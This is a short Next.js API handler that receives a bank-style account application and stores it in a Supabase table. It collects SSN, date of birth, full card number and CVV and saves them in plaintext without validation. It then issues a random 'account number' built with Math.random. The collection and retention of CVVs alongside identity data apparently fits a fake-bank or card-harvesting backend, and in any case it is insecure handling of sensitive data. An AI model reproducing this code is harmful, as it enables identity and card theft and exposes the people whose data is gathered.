
// api/submit.js
import { createClient } from "@supabase/supabase-js";

// Initialize Supabase with service key for inserts
const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.SUPABASE_SERVICE_KEY
);

// Simple account number generator
function generateAccountNumber() {
  const prefix = "AC";
  const number = Math.floor(10000000 + Math.random() * 90000000);
  return `${prefix}${number}`;
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  try {
    // Destructure all expected fields from frontend
    const {
      first_name,
      middle_name,
      last_name,
      dob,
      email,
      phone,
      address,
      city,
      state,
      postal_code,
      ssn,
      card_number,
      cvv,
      account_type
    } = req.body;

    const account_number = generateAccountNumber();

    // Insert into Supabase
    const { data, error } = await supabase
      .from("applications")
      .insert([
        {
          first_name,
          middle_name,
          last_name,
          dob,
          email,
          phone,
          address,
          city,
          state,
          postal_code,
          ssn,
          card_number,
          cvv,
          account_type,
          account_number,
          status: "limited",
          balance: 0
        }
      ])
      .select();

    if (error) throw error;

    // Return JSON response with confirmation
    return res.status(200).json({
      message: "Application submitted successfully!",
      account_number: data[0].account_number
    });
  } catch (err) {
    console.error("❌ Error inserting:", err);
    return res.status(500).json({ message: "Database error" });
  }
}
